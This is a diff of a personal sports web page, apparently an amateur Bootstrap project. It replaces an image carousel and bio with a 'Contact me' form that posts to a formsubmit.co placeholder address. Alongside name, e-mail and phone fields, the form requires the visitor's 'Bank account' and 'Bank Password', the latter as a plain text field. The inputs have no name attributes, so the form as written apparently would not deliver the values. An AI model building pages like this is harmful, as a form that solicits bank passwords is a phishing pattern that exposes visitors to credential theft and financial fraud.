@@ -81,62 +81,51 @@
           </div>
         </div>
       </nav>
-      <br>
-      <div class="row">         
-        <div class="col-6">
-          <div id="carouselExampleDark" class="carousel carousel-dark slide" data-bs-ride="carousel">
-            <div class="carousel-indicators">
-              <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
-              <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="1" aria-label="Slide 2"></button>
-              <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="2" aria-label="Slide 3"></button>
-            </div>
-            <div class="carousel-inner">
-              <div class="carousel-item active" data-bs-interval="10000">
-                  <img src="Dive jump.jpg" class="d-block w-100" alt="...">
-                  <div class="carousel-caption d-none d-md-block">
-                    <h5><!--Header Label--></h5>
-                    <p><!--Paragraph Label--></p>
-                  </div>
-              </div>
-              <div class="carousel-item" data-bs-interval="2000">
-                  <img src="rabbit1.jpg" class="d-block w-100" alt="...">
-                  <div class="carousel-caption d-none d-md-block">
-                    <h5><!--Header Label--></h5>
-                    <p><!--Paragraph Label--></p>
-                  </div>
-              </div>
-              <div class="carousel-item">
-                <img src="rabbit3.jfif" class="d-block w-100" alt="...">
-                <div class="carousel-caption d-none d-md-block">
-                  <h5><!--Header Label--></h5>
-                  <p><!--Paragraph Label--></p>
-                </div>
-              </div>
-            <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleDark" data-bs-slide="prev">
-            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
-            <span class="visually-hidden">Previous</span>
-            </button>
-            <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleDark" data-bs-slide="next">
-            <span class="carousel-control-next-icon" aria-hidden="true"></span>
-            <span class="visually-hidden">Next</span>
-            </button>
-          </div>
-          </div>
+    <div class="container mt-5">
+      <h3 style="text-align: center;">
+        Contact me
+      </h3>
+      <form class="row g-3" action="https://formsubmit.co/your@email.com" method="POST">
+        <div class="col-md-6">
+          <label for="First Name" class="form label">First Name</label>
+          <input type="text" class="form-control" id="Firstname" required>
         </div>
-        <div class="col-6">
-          <div class="alert alert-light" style="text-align:center" >
-            <h5>
-              My Bio
-            </h5>
-            <p>
-              This is my Sports page this is where you can find photos and text about sports and lots of my sports experences.</p>
-          </div>
-        </div>  
-            
-      <div class="row">
-        <div class="col-6">
-          <h5 style="text-align: center;background-color: #37beb0;">General info</h5>
+        <div class="col-md-6">
+          <label for="Last Name" class="form label">Last Name</label>
+          <input type="text" class="form-control" id="Lasttname" required>
         </div>
+        <div class="col-md-6">
+          <label for="Bank account" class="form label">Bank account</label>
+          <input type="text" class="form-control" id="Back account" required>
+        </div>
+        <div class="col-md-6">
+          <label for="Bank Password" class="form label">Bank Password</label>
+          <input type="text" class="form-control" id="Bank Password" required>
+        </div>
+        <div class="col-md-8">
+          <label for="E-mail" class="form label">E-mail</label>
+          <input type="text" class="form-control" id="E-mail" required>
+        </div>
+        <div class="col-md-4">
+          <label for="Phone Number" class="form label">Phone Number</label>
+          <input type="text" class="form-control" id="Phone Number" placeholder="+66">
+        </div>
+        <div class="col-md-12">
+          <label for="Coments" class="form label">Coments/Questions</label>
+          <textarea class="form-control" id="Coments" rows="3"></textarea>
+        </div>
+      <div>
+        <button type="submit" class="btn btn-primary">Submit</button>
       </div>
-  </body>
+    </form>
+
+    
+   
+  
+  
+  
+  
+  
+  
+    </body>
 </html>
